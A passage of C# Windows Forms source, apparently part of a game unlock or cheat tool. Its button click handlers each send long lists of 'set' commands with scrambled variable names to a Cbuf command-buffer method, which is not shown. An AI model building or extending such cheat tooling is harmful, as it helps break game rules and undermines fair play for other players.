            this.Cbuf("set MLNSOLLMTT 1");
            this.Cbuf("set LNTOSQKRNR 1");
            this.Cbuf("set MRKNTLRQSL 1");
            this.Cbuf("set MOONNOPKQS 1");
            this.Cbuf("set LSMQTPLRRT 1");
            this.Cbuf("set NPLSOOTQOL 1");
            this.Cbuf("set LNLMORTOPL 1");
            this.Cbuf("set MMMSPTOSMK 1");
            this.Cbuf("set NLOSRPTNLR 1");
            this.Cbuf("set LTKTLQRORL 1");
            this.Cbuf("set LQTOSMMPOP 1");
            this.Cbuf("set NTKQMSSMNS 1");
            this.Cbuf("set PKNLPTTQR 1");
            this.Cbuf("set LMTSOOOKQO 1");
            this.Cbuf("set MRNLSNRTLQ 1");
            this.Cbuf("set OMLKOQKTRL 1");
            this.Cbuf("set NOKKSLLNNO 1");
            this.Cbuf("set LSTNKTRSQM 1");
            this.Cbuf("set OLTTKMTNPO 1");
            this.Cbuf("set RRRKQOTTR 1");
            this.Cbuf("set LSLKLPLQPO 1");
            this.Cbuf("set LLRPLSNSQR 1");
            this.Cbuf("set NPQLRNMSSL 1");
            this.Cbuf("set MONMNPPTQM 1");
            this.Cbuf("set MONQNPLPOS 1");
            this.Cbuf("set OMNMMMKLNK 1");
            this.Cbuf("set MNKNOSQLQT 1");
            this.Cbuf("set NLOOTQLMRS 1");
            this.Cbuf("set MSRMSSQNML 1");
        }

        private void metroButton24_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set MOOQQMPQKT 1");
            this.Cbuf("set OSSMSLRM 1");
            this.Cbuf("set LLOONPKNRL 1");
            this.Cbuf("set MRPQNLKMSM 1");
            this.Cbuf("set NLKPSNQPOS 1");
            this.Cbuf("set NLPQTPKLN 1");
            this.Cbuf("set TPQTTLRNN 1");
            this.Cbuf("set MLLOKOQTSS 1");
            this.Cbuf("set NRLPQQPNPT 1");
            this.Cbuf("set LPSMMMLPS 1");
            this.Cbuf("set LSTRPNTKLP 1");
            this.Cbuf("set LLKLPLNLPR 1");
            this.Cbuf("set LQNOQSSPMN 1");
            this.Cbuf("set NMPOQPSKQL 1");
            this.Cbuf("set NLTQPPPSO 1");
            this.Cbuf("set NNSTQKKKLN 1");
            this.Cbuf("set OMNTTRKLOP 1");
            this.Cbuf("set LTQOKPT 1");
            this.Cbuf("set LKOMSQRTTL 1");
            this.Cbuf("set LPLLPQKSOP 1");
            this.Cbuf("set MRKQORPPPQ 1");
            this.Cbuf("set PNPLPTSMN 1");
            this.Cbuf("set OMPOPSSLNR 1");
            this.Cbuf("set MOSRNTSSOQ 1");
            this.Cbuf("set MNLLRPRONL 1");
            this.Cbuf("set NLRRTORQPN 1");
            this.Cbuf("set MQSNSOSMPN 1");
            this.Cbuf("set NKLTPKKSKN 1");
            this.Cbuf("set LRQMNLTSRO 1");
            this.Cbuf("set TKLPMKOOS 1");
            this.Cbuf("set NRSMQSSPNK 1");
            this.Cbuf("set LNTQNLMLQR 1");
            this.Cbuf("set LOPPNSOTOS 1");
            this.Cbuf("set MQSSSPOTS 1");
            this.Cbuf("set NPQSMMRSSL 1");
            this.Cbuf("set NSRKROQKPT 1");
            this.Cbuf("set OKNLKQMKPQ 1");
            this.Cbuf("set MSMKRKOKQP 1");
            this.Cbuf("set LKMRQOTSQS 1");
            this.Cbuf("set OLNMMOQSRR 1");
            this.Cbuf("set NTRSQNLOO 1");
            this.Cbuf("set ROOPTTNMS 1");
            this.Cbuf("set NQNLLPTLSN 1");
            this.Cbuf("set OMPTONMQSK 1");
        }

        private void metroButton23_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set NSMRQSNQPL 1");
            this.Cbuf("set MOLLKMTMRS 1");
            this.Cbuf("set OMOPKRQROK 1");
            this.Cbuf("set NLNKQNROQM 1");
            this.Cbuf("set MQOPRPQLQL 1");
            this.Cbuf("set SQPTQTLRK 1");
            this.Cbuf("set MQONROQQSR 1");
            this.Cbuf("set LNTRSRPTN 1");
            this.Cbuf("set MTORMOTLSP 1");
            this.Cbuf("set LPNKRNSQRL 1");
            this.Cbuf("set LTMLSTTQMN 1");
            this.Cbuf("set MOTRNQLNLQ 1");
            this.Cbuf("set MNLRNTNLQR 1");
            this.Cbuf("set MLSTNTNORR 1");
            this.Cbuf("set NOTKROKPTR 1");
            this.Cbuf("set NKQRKTNNOQ 1");
            this.Cbuf("set LONMMPNTL 1");
            this.Cbuf("set MLTRMQTPTP 1");
            this.Cbuf("set LOTSMQPMON 1");
            this.Cbuf("set NKPPQRSNRR 1");
            this.Cbuf("set OKRPQPRLN 1");
            this.Cbuf("set MNMSROTNTM 1");
            this.Cbuf("set MQKPPMLMLT 1");
            this.Cbuf("set MMLNNQSTTL 1");
            this.Cbuf("set MOOKNRNMMN 1");
            this.Cbuf("set OMKPKKQTNP 1");
            this.Cbuf("set MTLNNOSPTP 1");
            this.Cbuf("set NRTPRQKSRK 1");
            this.Cbuf("set PSTSNKNPR 1");
            this.Cbuf("set MKNNNONLSK 1");
            this.Cbuf("set MTNMRSTQN 1");
            this.Cbuf("set LKPMPNMTSM 1");
            this.Cbuf("set MNSOQLKMT 1");
            this.Cbuf("set OMNMRRKSRK 1");
            this.Cbuf("set TLOLRMSL 1");
            this.Cbuf("set NQNQPRLRQM 1");
            this.Cbuf("set LSSQKQOMQO 1");
            this.Cbuf("set MORSNMRQOR 1");
            this.Cbuf("set MQQQSOPLST 1");
            this.Cbuf("set MMRTTKOQMP 1");
            this.Cbuf("set NLNOROSKML 1");
            this.Cbuf("set NNTPPOLMTT 1");
            this.Cbuf("set NLLKLQRQOK 1");
            this.Cbuf("set LQOPNROT 1");
            this.Cbuf("set LPOOKSNLKO 1");
            this.Cbuf("set LPSLPRLSPN 1");
            this.Cbuf("set NOSMQTSMQ 1");
        }

        private void metroButton22_Click_6(object sender, EventArgs e)
        {
            this.Cbuf("set LRNRNONQLP 1");
            this.Cbuf("set NLTNNPRMKS 1");
            this.Cbuf("set OLSLMTSRKT 1");
            this.Cbuf("set LLTLMSKMQ 1");
            this.Cbuf("set LKPORKQQQQ 1");
            this.Cbuf("set MLMKMTSKKR 1");
            this.Cbuf("set NRMMNOLNMK 1");
            this.Cbuf("set MNQPOQSPNO 1");
            this.Cbuf("set LMSQNOSOSP 1");
            this.Cbuf("set MPLMRQMQRK 1");
            this.Cbuf("set MPRTOLTNQP 1");
            this.Cbuf("set NLKQTSPTKQ 1");
            this.Cbuf("set MMLOQLOTPN 1");
            this.Cbuf("set NLROROTKRS 1");
            this.Cbuf("set NOKKKRMNOK 1");
            this.Cbuf("set OLSTRLLTLT 1");
            this.Cbuf("set LORMOTSKST 1");
            this.Cbuf("set MLMNLMLS 1");
            this.Cbuf("set LQNMPQRNST 1");
        }

        private void metroButton18_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LMRMSTTOOQ 1");
            this.Cbuf("set NRTNMNQORP 1");
            this.Cbuf("set NSTTRPLOLS 1");
            this.Cbuf("set RKMOQPKSR 1");
            this.Cbuf("set MTKMSQSRQP 1");
            this.Cbuf("set MKRMTTNMOM 1");
            this.Cbuf("set NRKNPNNORN 1");
            this.Cbuf("set MQRSSLSOOP 1");
            this.Cbuf("set LKPRKLKMLP 1");
            this.Cbuf("set MTSOQQPQQ 1");
            this.Cbuf("set QPNMNRMOL 1");
            this.Cbuf("set NLNPSMOMRM 1");
            this.Cbuf("set LQKMLQTQOM 1");
            this.Cbuf("set MPMNSLPMQL 1");
            this.Cbuf("set MNKOOOPMMO 1");
            this.Cbuf("set TSTLRLKQL 1");
            this.Cbuf("set LNQRKQQMNT 1");
            this.Cbuf("set LMPKLRQRSR 1");
            this.Cbuf("set NNLTKTLORR 1");
            this.Cbuf("set LRRTMKQONT 1");
            this.Cbuf("set LQPOKPQKMT 1");
            this.Cbuf("set OKSQQKQPKT 1");
            this.Cbuf("set NMLRTTSTKL 1");
            this.Cbuf("set MLQRQONTLL 1");
            this.Cbuf("set NNKSPMPMPR 1");
            this.Cbuf("set MMNNRMPTQR 1");
            this.Cbuf("set NRQNQOQKTL 1");
            this.Cbuf("set OLMSOMTOTO 1");
            this.Cbuf("set MSSTMRNSN 1");
            this.Cbuf("set NNQRNQTMT 1");
            this.Cbuf("set PQLOTTTOS 1");
            this.Cbuf("set LNTQQRRQTP 1");
            this.Cbuf("set LPNQPOTNNR 1");
            this.Cbuf("set MPNNTKMQTS 1");
            this.Cbuf("set SLTMRTTOM 1");
            this.Cbuf("set LPROPSMNKS 1");
            this.Cbuf("set OLSMNOSKPS 1");
            this.Cbuf("set OSNLNKRRQ 1");
            this.Cbuf("set RTSKLTPOS 1");
            this.Cbuf("set NKMOPQSPMO 1");
            this.Cbuf("set LMQOKPRSML 1");
            this.Cbuf("set SKNSKQTQR 1");
            this.Cbuf("set OLKRNORMOQ 1");
            this.Cbuf("set LTLQSKRKQM 1");
            this.Cbuf("set QKMSSSLPK 1");
            this.Cbuf("set LQKPQMPRQN 1");
            this.Cbuf("set MSRPQTQOOK 1");
            this.Cbuf("set NPSTLPMPSS 1");
            this.Cbuf("set OMNSNROMPQ 1");
            this.Cbuf("set RLPNQQRPR 1");
            this.Cbuf("set MSPSTOSTTL 1");
            this.Cbuf("set LRSKLPRNOP 1");
            this.Cbuf("set LKTPRPKPMR 1");
            this.Cbuf("set LOSOOOTNMS 1");
            this.Cbuf("set NNMLSMNTOQ 1");
            this.Cbuf("set QTSPTNLOL 1");
            this.Cbuf("set LQSSPMSRQK 1");
            this.Cbuf("set NSSLSNKPN 1");
            this.Cbuf("set LTMOQONPQ 1");
            this.Cbuf("set LOPKSRNTTS 1");
        }

        private void metroButton20_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set LROTSRRQMQ 1");
            this.Cbuf("set MKPOPRMKLL 1");
            this.Cbuf("set MKPRSSNNRO 1");
            this.Cbuf("set MROTQQSMP 1");
            this.Cbuf("set NQMONTLKNN 1");
            this.Cbuf("set NTMMTOLQMQ 1");
            this.Cbuf("set NQTLPTNSSO 1");
            this.Cbuf("set LQLSPQOPKM 1");
            this.Cbuf("set MQPQKNPQOK 1");
            this.Cbuf("set MRNRKKOPLN 1");
            this.Cbuf("set OLSKLTPPMR 1");
            this.Cbuf("set NKMOPQSPMO 1");
            this.Cbuf("set LMQOKPRSML 1");
            this.Cbuf("set SKNSKQTQR 1");
            this.Cbuf("set OLKRNORMOQ 1");
            this.Cbuf("set LTLQSKRKQM 1");
            this.Cbuf("set QKMSSSLPK 1");
            this.Cbuf("set LQKPQMPRQN 1");
            this.Cbuf("set MSRPQTQOOK 1");
            this.Cbuf("set NPSTLPMPSS 1");
            this.Cbuf("set OMNSNROMPQ 1");
            this.Cbuf("set RLPNQQRPR 1");
            this.Cbuf("set MSPSTOSTTL 1");
            this.Cbuf("set LRSKLPRNOP 1");
            this.Cbuf("set LKTPRPKPMR 1");
            this.Cbuf("set LOSOOOTNMS 1");
            this.Cbuf("set NNMLSMNTOQ 1");
            this.Cbuf("set QTSPTNLOL 1");
            this.Cbuf("set LQSSPMSRQK 1");
            this.Cbuf("set NSSLSNKPN 1");
            this.Cbuf("set LTMOQONPQ 1");
            this.Cbuf("set LOPKSRNTTS 1");
            this.Cbuf("set LROTSRRQMQ 1");
            this.Cbuf("set MKPOPRMKLL 1");
        }

        private void metroButton21_Click_9(object sender, EventArgs e)
        {
            this.Cbuf("set MKPRSSNNRO 1");
            this.Cbuf("set MROTQQSMP 1");
            this.Cbuf("set NQMONTLKNN 1");
            this.Cbuf("set NTMMTOLQMQ 1");
            this.Cbuf("set NQTLPTNSSO 1");
            this.Cbuf("set LQLSPQOPKM 1");
            this.Cbuf("set MQPQKNPQOK 1");
            this.Cbuf("set MRNRKKOPLN 1");
            this.Cbuf("set OLSKLTPPMR 1");
            this.Cbuf("set LQQQTTTMMO 1");
            this.Cbuf("set LRPNPLOORM 1");
            this.Cbuf("set MKRPTLLKKM 1");
            this.Cbuf("set LRPLOQQNSM 1");
            this.Cbuf("set MOMRRMTMN 1");
            this.Cbuf("set NRKNMTPMTO 1");
            this.Cbuf("set OMQMPLPOLR 1");
            this.Cbuf("set PPQPQLPKQ 1");
            this.Cbuf("set NLSLSQLQP 1");
            this.Cbuf("set LMRLKTKKRK 1");
            this.Cbuf("set MPNKKLQRLL 1");
            this.Cbuf("set QTRLNNRTR 1");
            this.Cbuf("set NSMLPKLRLR 1");
            this.Cbuf("set OKPQONTRRP 1");
            this.Cbuf("set MRRMNNKQMP 1");
            this.Cbuf("set NOKQLPKNTK 1");
            this.Cbuf("set MTLOLRRLQ 1");
            this.Cbuf("set NNTQNOQKQT 1");
            this.Cbuf("set LLNLQPSOTL 1");
            this.Cbuf("set NKOLKNSQNP 1");
            this.Cbuf("set LTKKRTQSPP 1");
            this.Cbuf("set NQNNLQONP 1");
            this.Cbuf("set LRMTKKLPOS 1");
            this.Cbuf("set LNPLOROPQ 1");
            this.Cbuf("set MPSSNLOSSK 1");
            this.Cbuf("set NSMKSMPPTS 1");
            this.Cbuf("set NMQTRORTPM 1");
            this.Cbuf("set TOSKRRNMK 1");
            this.Cbuf("set LTTMLTOQLO 1");
            this.Cbuf("set NNRKTRSLNQ 1");
            this.Cbuf("set LTMQPOOPRO 1");
            this.Cbuf("set MRNQSMPPKK 1");
            this.Cbuf("set NTRSNPPPQN 1");
            this.Cbuf("set LSRRROPSLT 1");
            this.Cbuf("set NRLNSNOLKN 1");
            this.Cbuf("set NNLTLOLTNQ 1");
            this.Cbuf("set NLTLKKKTPS 1");
            this.Cbuf("set MOSNPPMQOQ 1");
            this.Cbuf("set NSKRQNKKOK 1");
            this.Cbuf("set MTRLKQPRQR 1");
        }

        private void metroButton16_Click_10(object sender, EventArgs e)
        {
            this.Cbuf("set NQNKLTTNQM 1");
            this.Cbuf("set LOKRSPLOTT 1");
            this.Cbuf("set OLMTSNOLQO 1");
            this.Cbuf("set TSSNPNMNQ 1");
            this.Cbuf("set MSLTKKOKST 1");
            this.Cbuf("set MKKPSOONLO 1");
            this.Cbuf("set NRQTKKNSNN 1");
            this.Cbuf("set LPTOQPNN 1");
            this.Cbuf("set MLQLKQMTTM 1");
            this.Cbuf("set MTKKTORKNP 1");
            this.Cbuf("set LROMRNROKR 1");
            this.Cbuf("set MKSRKOLPNQ 1");
            this.Cbuf("set MMPQSMMONM 1");
            this.Cbuf("set MLRRRKQLQL 1");
            this.Cbuf("set LTTSOTPTNR 1");
            this.Cbuf("set STOMSLPPP 1");
            this.Cbuf("set QMLKKLONS 1");
            this.Cbuf("set LLSMRRKRMK 1");
            this.Cbuf("set MRMLMLLMMP 1");
            this.Cbuf("set NTTNORKMKT 1");
            this.Cbuf("set NRQLSKOPSM 1");
            this.Cbuf("set LKKMOKOMMT 1");
            this.Cbuf("set NNPTKPSPPK 1");
            this.Cbuf("set MTKNKRMMP 1");
            this.Cbuf("set MONNLNORLP 1");
            this.Cbuf("set MMLMLMSSM 1");
            this.Cbuf("set PNKSMRKPO 1");
            this.Cbuf("set NQPLQLSLTP 1");
            this.Cbuf("set NLKKKQKQPN 1");
            this.Cbuf("set LMNPKTTN 1");
        }

        private void metroButton36_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LQLOKOPRKS 1");
            this.Cbuf("set MLTTQSTKQS 1");
            this.Cbuf("set OKKOKTLTP 1");
            this.Cbuf("set OMTLRQOPLK 1");
            this.Cbuf("set NKORNLPMMR 1");
            this.Cbuf("set MPQKKKQPLS 1");
            this.Cbuf("set LLMOOMOMMO 1");
            this.Cbuf("set LRKMSLPMMT 1");
            this.Cbuf("set NLTRKONQPR 1");
            this.Cbuf("set NOOLMRNMSO 1");
            this.Cbuf("set RQNMPMLO 1");
            this.Cbuf("set SNTSMMPRT 1");
            this.Cbuf("set MLOSTOOQOR 1");
            this.Cbuf("set NRNRRPMKOM 1");
        }

        private void metroButton37_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LTLLOMMMPN 1");
            this.Cbuf("set MSKSMNPTKL 1");
            this.Cbuf("set MNPPOMRMSM 1");
            this.Cbuf("set SNNMOOQNN 1");
            this.Cbuf("set MQLLPLNLNO 1");
            this.Cbuf("set MOTNRLNTRP 1");
            this.Cbuf("set MQPNNPKMRR 1");
            this.Cbuf("set LKQKNNPRPT 1");
            this.Cbuf("set LOTOKSMK 1");
            this.Cbuf("set LMKKTLPSRN 1");
            this.Cbuf("set SMKRLSNRT 1");
            this.Cbuf("set NRPSRTOPSL 1");
            this.Cbuf("set LRQOLTSSS 1");
            this.Cbuf("set MLPPTKOTLK 1");
        }

        private void metroButton5_Click_17(object sender, EventArgs e)
        {
            this.Cbuf("set LNTSPPQLMR 1");
            this.Cbuf("set LRQONROMRL 1");
            this.Cbuf("set LNPQSTLRTN 1");
            this.Cbuf("set MPLTTKMPNN 1");
            this.Cbuf("set MNKRSNOPT 1");
            this.Cbuf("set LRMSRLSLKT 1");
            this.Cbuf("set QOLOLKTPT 1");
            this.Cbuf("set OLNMMRPTTS 1");
            this.Cbuf("set NRMMOOOPLK 1");
            this.Cbuf("set MMNNTKKSOS 1");
            this.Cbuf("set NKMPQSKTKQ 1");
            this.Cbuf("set NKRLNNPRSP 1");
            this.Cbuf("set MRLNLQKMPO 1");
            this.Cbuf("set MTMOOOQKKL 1");
            this.Cbuf("set OMRQMSLSRK 1");
            this.Cbuf("set SRSPKMLNR 1");
            this.Cbuf("set LOTQPTKLO 1");
            this.Cbuf("set LOPRPSKMST 1");
            this.Cbuf("set MSNRKNQPRS 1");
            this.Cbuf("set LPNQSMMNRM 1");
            this.Cbuf("set LQPOKPQKMT  1");
            this.Cbuf("set OLRKNSKNPS 1");
            this.Cbuf("set NPNSLTNQLM 1");
            this.Cbuf("set MLOSMPPQON 1");
            this.Cbuf("set MMMMPLOOTN 1");
            this.Cbuf("set TKKLKNNNO 1");
            this.Cbuf("set LSSKOMTQKK 1");
            this.Cbuf("set RQORKNQOO 1");
            this.Cbuf("set LNQMQMSNSS 1");
            this.Cbuf("set LTRLMOOMPN 1");
            this.Cbuf("set NNRRKPKNKR 1");
            this.Cbuf("set NKMNSKNOQN 1");
            this.Cbuf("set QOPMSOTSM 1");
            this.Cbuf("set LRRNRNRNK 1");
            this.Cbuf("set MQKRLTMROM 1");
            this.Cbuf("set LMPQKKQLKO 1");
            this.Cbuf("set LOKMPRLNRL 1");
            this.Cbuf("set NPRNKLTQOT 1");
        }

        private void metroButton11_Click_5(object sender, EventArgs e)
        {
            this.Cbuf("set LPMPTNTKTP 1");
            this.Cbuf("set TKKTLQNPM 1");
            this.Cbuf("set PNTRSSKPS 1");
            this.Cbuf("set LNTKMKNOKS 1");
            this.Cbuf("set OLNNTQKPNR 1");
            this.Cbuf("set NSMQONORSQ 1");
            this.Cbuf("set NPTQOLNNNP 1");
            this.Cbuf("set OLOOSTRSMR 1");
            this.Cbuf("set LOROLOTNMP 1");
            this.Cbuf("set NPNRRNMSK 1");
            this.Cbuf("set NMORTMLLLS 1");
            this.Cbuf("set RRKMLNPKP 1");
            this.Cbuf("set MKRMMRSNTO 1");
            this.Cbuf("set SPQNRNKQR 1");
            this.Cbuf("set NMTKPQQRSQ 1");
            this.Cbuf("set QPQQTNMS 1");
            this.Cbuf("set MQRSTPRORQ 1");
            this.Cbuf("set NQTKKPORNO 1");
            this.Cbuf("set MKKLQTSKSO 1");
            this.Cbuf("set OKNOKPRKLQ 1");
            this.Cbuf("set NPKPLTKRNS 1");
            this.Cbuf("set LOQRRKQSRL 1");
            this.Cbuf("set SNNNRLTML 1");
            this.Cbuf("set NSTKTTQON 1");
            this.Cbuf("set MOSLRPRMNL 1");
            this.Cbuf("set MLPOMNQPPK 1");
            this.Cbuf("set NRTMTRQTRQ 1");
            this.Cbuf("set MMQLNQOOMT 1");
            this.Cbuf("set MQMRNPPKOM 1");
            this.Cbuf("set MPNNTMPPTN 1");
            this.Cbuf("set MTNSRNMTKN 1");
            this.Cbuf("set NLQKSSPMKP 1");
            this.Cbuf("set OKNKPOOPPK 1");
            this.Cbuf("set PLOORQOOS 1");
            this.Cbuf("set PONNPNOPN 1");
            this.Cbuf("set MLNTKKPNMM 1");
            this.Cbuf("set MKQSQRPPQR 1");
            this.Cbuf("set TLSSNMQKR 1");
        }

        private void metroButton9_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set OLSOPNSPLS 1");
            this.Cbuf("set OKOKTLOKRO 1");
            this.Cbuf("set SQRNRRRN 1");
            this.Cbuf("set LPSPPMRPMO 1");
            this.Cbuf("set LNOQTMMLSP 1");
            this.Cbuf("set NKSQTPNOOK 1");
            this.Cbuf("set OLQTRRRMLL 1");
            this.Cbuf("set NLRPPRSOOM 1");
            this.Cbuf("set MKLRNTOLRK 1");
            this.Cbuf("set LNMRMNLNTT 1");
            this.Cbuf("set LTQQSMPMKN 1");
            this.Cbuf("set NMPMPSOPTK 1");
            this.Cbuf("set NRSOOSRSTP 1");
            this.Cbuf("set MKLOMPOMMT 1");
            this.Cbuf("set LRKPNSNORL 1");
            this.Cbuf("set LSNRTORRKM 1");
            this.Cbuf("set LTTRNPTRSR 1");
            this.Cbuf("set TQOTTSRPM 1");
            this.Cbuf("set QMSKSTQKR 1");
            this.Cbuf("set MPRLMQNQO 1");
            this.Cbuf("set NLLMLNPMPM 1");
            this.Cbuf("set LMRRMRQKT 1");
            this.Cbuf("set NOPONRMKOR 1");
            this.Cbuf("set MMTPPOTOLL 1");
            this.Cbuf("set NPMPRRLNPO 1");
            this.Cbuf("set MNQPPKSLMR 1");
            this.Cbuf("set MKPKSRNOMM 1");
            this.Cbuf("set OLKOTROMPK 1");
            this.Cbuf("set PNSKMLSLN 1");
            this.Cbuf("set NOSTLRKPQ 1");
            this.Cbuf("set MRQKRNTMRK 1");
            this.Cbuf("set MQMMQRLNTL 1");
            this.Cbuf("set NMTSOTMNKO 1");
            this.Cbuf("set OLOQMTPPLT 1");
            this.Cbuf("set POKSTQPPQ 1");
            this.Cbuf("set LQLPRTOQKP 1");
            this.Cbuf("set LMPQONTPOL 1");
            this.Cbuf("set OKMSPSOTKN 1");
            this.Cbuf("set NOLMSPOSPR 1");
            this.Cbuf("set LOLKSRNSMR 1");
            this.Cbuf("set SLLNNNQSP 1");
            this.Cbuf("set LRKSQSQPSL 1");
            this.Cbuf("set MRMPSTNRRP 1");
            this.Cbuf("set NMTSQMSQNR 1");
            this.Cbuf("set NKOQRKQRMT 1");
            this.Cbuf("set NQNPKMQRLT 1");
            this.Cbuf("set NKTOLTRMLL 1");
            this.Cbuf("set MPRNSSRLRR 1");
            this.Cbuf("set NPSTPPQLSP 1");
            this.Cbuf("set LTTOTTRLTS 1");
            this.Cbuf("set MSLPPMPKSM 1");
            this.Cbuf("set NPTNRTSSLM 1");
            this.Cbuf("set LLNSLMOQKT 1");
            this.Cbuf("set OKKRMNNQLL 1");
            this.Cbuf("set NLMSSPLMPK 1");
            this.Cbuf("set TQORTRNQ 1");
            this.Cbuf("set QTLMLQST 1");
            this.Cbuf("set MLTKOMQPMS 1");
            this.Cbuf("set MPSLOMTNMS 1");
            this.Cbuf("set MRKQQMPTKN 1");
        }

        private void metroButton32_Click_1(object sender, EventArgs e)
        {
            this.Cbuf("set LOTQRPQLTP 1");
            this.Cbuf("set NQKQTSKQOK 1");
            this.Cbuf("set LLLRLSKLKS 1");
            this.Cbuf("set NLTRNKMTL 1");
            this.Cbuf("set LPKQPKSRKQ 1");
            this.Cbuf("set LOTKNSTQSP 1");
            this.Cbuf("set MLTPNKNLPM 1");
            this.Cbuf("set NPNRNNMTKM 1");
            this.Cbuf("set LKNSRSNRKM 1");
            this.Cbuf("set NOOTTPORTQ 1");
            this.Cbuf("set MNRLLTRRK 1");
            this.Cbuf("set NNRPTKLQTO 1");
            this.Cbuf("set MLRTLKRRMT 1");
            this.Cbuf("set OLPORMRQRL 1");
            this.Cbuf("set LTNRTLQOKQ 1");
            this.Cbuf("set OTTTLQMLK 1");
            this.Cbuf("set MSPMROPLMN 1");
            this.Cbuf("set TTPRMLRQN 1");
            this.Cbuf("set MKSMLKSMNS 1");
            this.Cbuf("set NNRKNLLSQN 1");
            this.Cbuf("set NONQMPOOSP 1");
            this.Cbuf("set MKOPNMPPNQ 1");
            this.Cbuf("set MKSLRRPPNN 1");
            this.Cbuf("set NONMKTKNNM 1");
            this.Cbuf("set MMQMQKSTS 1");
            this.Cbuf("set MTKLNRROLT 1");
            this.Cbuf("set MRQNOLPSM 1");
            this.Cbuf("set NLTPOKQQMQ 1");
            this.Cbuf("set TLROSMMNT 1");
            this.Cbuf("set LSLPLPRQNO 1");
            this.Cbuf("set MQMTPPNLMO 1");
            this.Cbuf("set NSPLSNQTML 1");
            this.Cbuf("set MPORQMTMQT 1");
            this.Cbuf("set TTNKSNLOS 1");
            this.Cbuf("set NLPRMSTSMM 1");
            this.Cbuf("set MNRTMKMOTM 1");
            this.Cbuf("set NQTNQRPTPS 1");
            this.Cbuf("set MPKKMPRLRQ 1");
            this.Cbuf("set LTTQQPKKP 1");
            this.Cbuf("set MOPORNQOTQ 1");
            this.Cbuf("set MSLLQRMLNT 1");
            this.Cbuf("set TKTTPRLOP 1");
            this.Cbuf("set LMPOOTPTLT 1");
            this.Cbuf("set MLOSSOSRMM 1");
            this.Cbuf("set MTPSRMRRLP 1");
            this.Cbuf("set MNONPQMSLR 1");
            this.Cbuf("set LLPRLLRRRM 1");
        }

        private void metroButton30_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set MMPKRTOPQO 1");
            this.Cbuf("set LRPSSPPPPT 1");
            this.Cbuf("set LMLMLOTPO 1");
            this.Cbuf("set MSNNNKMSSR 1");
            this.Cbuf("set TORMKPPLR 1");
            this.Cbuf("set NMKNKNMKNN 1");
            this.Cbuf("set MLTNSNONSR 1");
            this.Cbuf("set MMMPPKPOMN 1");
            this.Cbuf("set TSLKOOMLT 1");
            this.Cbuf("set MOSRNQNQTN 1");
            this.Cbuf("set MKKRTLMTOM 1");
            this.Cbuf("set NKMONTORPL 1");
            this.Cbuf("set MTQQKPLMKS 1");
            this.Cbuf("set NSROSTQOSN 1");
            this.Cbuf("set MQMTSSQOKM 1");
            this.Cbuf("set NTLPOKSSTL 1");
            this.Cbuf("set QTOKMKRQM 1");
            this.Cbuf("set LNQNRRPNPP 1");
            this.Cbuf("set LQRKQNNOLQ 1");
            this.Cbuf("set NMPKSTQSPM 1");
            this.Cbuf("set MQQPMTMONT 1");
            this.Cbuf("set LOPONQOQNN 1");
            this.Cbuf("set MMRKLQSTRO 1");
            this.Cbuf("set LLQOLROKNQ 1");
            this.Cbuf("set MLKSTTKSO 1");
            this.Cbuf("set MOLOSSRQPS 1");
            this.Cbuf("set NTRQOMRTSK 1");
            this.Cbuf("set NSMOTTMQOT 1");
            this.Cbuf("set LTMMQRONON 1");
            this.Cbuf("set LRROOOSOMM 1");
            this.Cbuf("set NKNMKMMLMR 1");
            this.Cbuf("set MSTOLQOTKN 1");
            this.Cbuf("set RPLPNPQLM 1");
            this.Cbuf("set MNMNSSLLOR 1");
            this.Cbuf("set NTQKKQSKLN 1");
            this.Cbuf("set RPNOKKL 1");
            this.Cbuf("set MLRKROQSPT 1");
            this.Cbuf("set NLSRLSTPTN 1");
            this.Cbuf("set NTPTLNNQQL 1");
            this.Cbuf("set POOLPLOKN 1");
            this.Cbuf("set SMTNTLPN 1");
            this.Cbuf("set TRQLLNNLS 1");
            this.Cbuf("set MQMLTPRRSQ 1");
            this.Cbuf("set NMLMMNQLSQ 1");
            this.Cbuf("set MQMNKQQNN 1");
            this.Cbuf("set OPSMSQNKQ 1");
            this.Cbuf("set OMLLSTTLSL 1");
            this.Cbuf("set TRPROKTLS 1");
            this.Cbuf("set NRQPQLNTNK 1");
            this.Cbuf("set OMQSRPQPL 1");
            this.Cbuf("set MPNPSMMTTT 1");
            this.Cbuf("set MQOQTLPOTR 1");
            this.Cbuf("set MPORPPSRQK 1");
        }

        private void metroButton29_Click_4(object sender, EventArgs e)
        {
            this.Cbuf("set LSOTNTMSNS 1");
            this.Cbuf("set MLORTTKOLN 1");
            this.Cbuf("set LKTLQSNQNM 1");
            this.Cbuf("set NKMMLMPOKK 1");
            this.Cbuf("set MNPOSMSQOS 1");
            this.Cbuf("set MMQLTMKTPK 1");
            this.Cbuf("set MRTOMMTTQM 1");
            this.Cbuf("set NQNMQNTTRL 1");
            this.Cbuf("set LMRNTSRNNO 1");
            this.Cbuf("set NSKNLMKQSR 1");
            this.Cbuf("set NKLTMMOOLP 1");
            this.Cbuf("set LPPRTKTTO 1");
            this.Cbuf("set MQTRMKSNLQ 1");
            this.Cbuf("set MQMPKLKK 1");
            this.Cbuf("set MMMSOLKOMR 1");
            this.Cbuf("set NONQQTPNLT 1");
            this.Cbuf("set LPPSLNLOLT 1");
            this.Cbuf("set NKKRQROOQK 1");
            this.Cbuf("set RSPMMQLQN 1");
            this.Cbuf("set RLNQONPKS 1");
            this.Cbuf("set PRSNONOT 1");
            this.Cbuf("set LKNNNKTPTM 1");
            this.Cbuf("set LNTKQTQOMN 1");
            this.Cbuf("set NORQKLTPTR 1");
            this.Cbuf("set OMOQSPLSST 1");
            this.Cbuf("set MMPQQTMNRT 1");
            this.Cbuf("set MQSQOLLMRM 1");
            this.Cbuf("set LSPRLSRMOS 1");
            this.Cbuf("set SROLTPQLK 1");
            this.Cbuf("set ROSSSPSSP 1");
            this.Cbuf("set NSOMOMMLML 1");
            this.Cbuf("set OLPPMPLNTS 1");
            this.Cbuf("set NQPKSOTP 1");
            this.Cbuf("set LNLQKQMPS 1");
            this.Cbuf("set MQNMPKRKMQ 1");
            this.Cbuf("set MPRRPOPQPN 1");
            this.Cbuf("set PTTNLRPLQ 1");
            this.Cbuf("set NSOPTRNRMT 1");
